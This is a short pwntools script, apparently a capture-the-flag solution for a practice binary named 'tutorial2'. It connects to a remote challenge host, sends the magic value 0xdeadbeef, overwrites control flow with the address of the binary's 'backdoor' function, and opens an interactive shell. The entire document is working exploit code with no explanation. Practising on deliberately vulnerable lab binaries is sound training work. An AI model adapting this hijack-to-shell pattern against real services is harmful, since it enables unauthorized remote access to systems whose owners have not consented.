from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10133)
e = ELF('./tutorial2')
io.recvuntil(':')
io.send(p32(0xdeadbeef))
backdoor = e.symbols['backdoor'] # 0x4006e6
io.recvuntil('?')
io.send(p64(backdoor))
io.interactive()